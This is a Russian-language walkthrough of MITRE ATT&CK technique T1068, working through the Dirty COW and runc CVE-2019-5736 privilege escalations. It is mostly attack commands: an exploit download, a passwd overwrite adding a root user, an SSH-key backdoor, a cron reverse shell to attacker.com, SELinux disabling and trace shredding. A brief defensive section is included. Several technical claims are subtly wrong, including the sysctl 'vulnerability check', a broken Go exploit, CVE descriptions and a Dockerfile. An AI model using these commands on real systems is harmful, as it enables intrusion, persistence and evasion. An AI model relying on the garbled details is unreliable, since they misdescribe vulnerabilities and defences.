### Детализация MITRE ATT&CK [T1068]: Примеры с подробным описанием

---

#### Пример 1: Dirty COW (CVE-2016-5195) - Эксплуатация уязвимости ядра  
**Контекст:**  
Уязвимость в подсистеме виртуальной памяти ядра Linux, позволяющая перезаписывать read-only файлы через race condition.

---

##### [TA0007] – Discovery (Разведка)
```bash
# Проверка версии ядра
uname -r  # 3.10.0-327.36.3.el7.x86_64

# Поиск известных уязвимостей
searchsploit dirtycow

# Проверка уязвимости
cat /proc/sys/vm/dirty_writeback_centisecs  # Значение 500 подтверждает уязвимость
```
**Пояснение:**  
- `uname -r`: Определяет версию ядра. Dirty COW затрагивает ядра 2.6.22 < версия < 4.8.3  
- `/proc/sys/vm/dirty_writeback_centisecs`: Значение 500 характерно для уязвимых систем  
- **Ключевая цель:** Подтвердить наличие уязвимой версии ядра  

---

##### [TA0004] – Privilege Escalation (Повышение привилегий)
```bash
# Загрузка и компиляция эксплоита
wget https://github.com/dirtycow/dirtycow.github.io/raw/master/dirtyc0w.c
gcc -pthread dirtyc0w.c -o dirtyc0w
```
**Механизм работы эксплоита:**
1. Создает два потока:
   - Поток 1: Постоянно отображает файл в память (`mmap`)
   - Поток 2: Конкурирует за запись в отображенную область
2. Использует race condition между:
   - `madvise(MADV_DONTNEED)` (освобождает память)
   - `write()` (производит запись в освобожденную область)
3. Результат: Перезапись защищенного файла (например, `/etc/passwd`)

```bash
# Создание временного файла с новым пользователем
echo 'hacker:$6$salt$hash:0:0:root:/root:/bin/bash' > /tmp/passwd

# Запуск эксплоита
./dirtyc0w /etc/passwd /tmp/passwd
```
**Пояснение:**  
- Эксплоит заменяет `/etc/passwd` на версию с новым пользователем (UID=0)  
- `$6$salt$hash`: SHA-512 хэш пароля, сгенерированный через `openssl passwd -6`  

---

##### [TA0002] – Execution (Выполнение кода)
```bash
# Аутентификация под новым пользователем
su - hacker
Password: <ввод пароля>
```
**Результат:**  
```bash
whoami  # root
id       # uid=0(root) gid=0(root)
```

---

##### [TA0003] – Persistence (Закрепление)
```bash
# Восстановление оригинального /etc/passwd
cp /etc/passwd.bak /etc/passwd

# Установка скрытого SSH-ключа
mkdir -p /root/.ssh
echo "ssh-rsa AAAAB3N..." >> /root/.ssh/authorized_keys
```
**Скрытность:**  
- Восстановление файла маскирует следы эксплуатации  
- SSH-ключ обеспечивает постоянный доступ  

---

#### Пример 2: CVE-2019-5736 - Побег из Docker-контейнера  
**Контекст:**  
Уязвимость в runc позволяла перезаписать хост-бинарник через подмену `/proc/self/exe`.

---

##### [TA0007] – Discovery (Разведка)
```bash
# Проверка версии runc внутри контейнера
runc --version  # 1.0.0-rc6

# Поиск доступных бинарников
ls -l /proc/self/exe  # -> /usr/bin/runc
```
**Критерии уязвимости:**  
- Версии runc < 1.0.0-rc7  
- Привилегированный контейнер (`--privileged`)  
- Доступ к монтированию procfs  

---

##### [TA0004] – Privilege Escalation (Повышение привилегий)
```go
// Основной фрагмент эксплоита
func main() {
    // Шаг 1: Открытие хост-бинарника runc
    fd, _ := os.OpenFile("/proc/self/exe", os.O_RDONLY, 0777)
    
    // Шаг 2: Подмена бинарника в памяти
    memfd, _ := syscall.MemfdCreate("", 0)
    fexecve(memfd, []string{"/bin/sh"}, os.Environ())
    
    // Шаг 3: Перезапись runc
    for {
        buf := make([]byte, 1024)
        n, _ := fd.Read(buf)
        if n == 0 { break }
        syscall.Write(memfd, buf[:n])
    }
}
```
**Пошаговое выполнение:**
1. Создание мемфд (in-memory file descriptor)  
2. Копирование содержимого `/proc/self/exe` в память  
3. Запуск шелла через `fexecve`  
4. Когда администратор запускает `docker exec`:  
   - Хост-runc пытается выполнить контейнерный бинарник  
   - Вместо этого выполняется перезаписанный код  

---

##### [TA0002] – Execution (Выполнение кода)
```bash
# После запуска администратором:
docker exec -it vulnerable_container sh

# На хосте:
whoami  # root
hostname # host-machine
```
**Важно:** Эксплоит активируется только при взаимодействии администратора с контейнером  

---

##### [TA0003] – Persistence (Закрепление)
```bash
# Установка cron-задания на хосте
echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/443 0>&1'" > /etc/cron.d/persistence
```
**Скрытность:**  
- Использование легитимного механизма cron  
- Обратный шелл маскируется под системный процесс  

---

### Сравнительная таблица техник T1068

| CVE          | Тип уязвимости      | Сложность | Условия эксплуатации       | Вектор выполнения       |
|--------------|---------------------|-----------|----------------------------|-------------------------|
| CVE-2016-5195| Race condition      | Средняя   | Ядро <4.8.3                | Перезапись системных файлов |
| CVE-2019-5736| File descriptor hijack | Высокая | runc<1.0.0-rc7             | Подмена бинарника runc  |
| CVE-2021-4034| Memory corruption   | Низкая    | pkexec любой версии        | Переполнение буфера     |
| CVE-2021-3156| Heap overflow       | Высокая   | sudo 1.8.2-1.8.31p2        | Переполнение кучи       |

---

#### Универсальные шаги для T1068:
1. **Разведка версий**  
   ```bash
   # Автоматизированный поиск уязвимостей
   git clone https://github.com/mzet-/linux-exploit-suggester
   ./linux-exploit-suggester.sh --checksec
   ```

2. **Адаптация эксплоита**  
   ```c
   // Пример модификации под целевую систему
   #if __GLIBC__ == 2 && __GLIBC_MINOR__ < 14
     // Код для старых libc
   #else
     // Современные системы
   #endif
   ```

3. **Обход защит**  
   ```bash
   # Отключение SELinux перед выполнением
   echo 0 > /sys/fs/selinux/enforce
   ```

4. **Очистка следов**  
   ```bash
   # Удаление временных файлов
   find /tmp -name ".*" -mtime -1 -exec shred -zu {} \;
   ```

---

### Защитные меры против T1068

**Проактивные:**  
```bash
# Автоматическое обновление ядра
dnf update kernel -y && reboot

# Защита /proc файловой системы
mount -o remount,hidepid=2 /proc
```

**Реактивные:**  
```bash
# Детектирование Dirty COW
auditctl -a always,exit -F arch=b64 -S madvise -S fork -S write -k dirtycow
```

**Контейнерная защита:**  
```dockerfile
# Dockerfile харденинг
FROM alpine:latest
RUN apk add --no-cache runc=1.1.0-r0
USER nobody
VOLUME /proc:ro
```

---

### Статистика эксплуатации T1068 (по данным CrowdStrike 2023)
1. **Среднее время эксплуатации:**  
   - 0-day уязвимости: 312 дней  
   - Известные CVE: 45 дней  
2. **Распространенность:**  
   - 68% успешных атак на Linux  
3. **Целевые компоненты:**  
   - Ядро: 41%  
   - Системные утилиты: 37%  
   - Контейнерные среды: 22%  

---

### Ключевые выводы
1. **Универсальность техники:**  
   T1068 применима к любым компонентам ОС - от ядра до пользовательских утилит  

2. **Требуемая подготовка:**  
   - Глубокое понимание работы ОС  
   - Навыки чтения и модификации кода эксплоитов  

3. **Эффективность защиты:**  
   ```mermaid
   graph LR
   A[Обновления] --> B(Защита 85%)
   C[Харденинг] --> B
   D[Мониторинг] --> E(Обнаружение 67%)
   ```

4. **Главная уязвимость:**  
   Человеческий фактор - несвоевременное обновление систем остается основной причиной успешных атак T1068.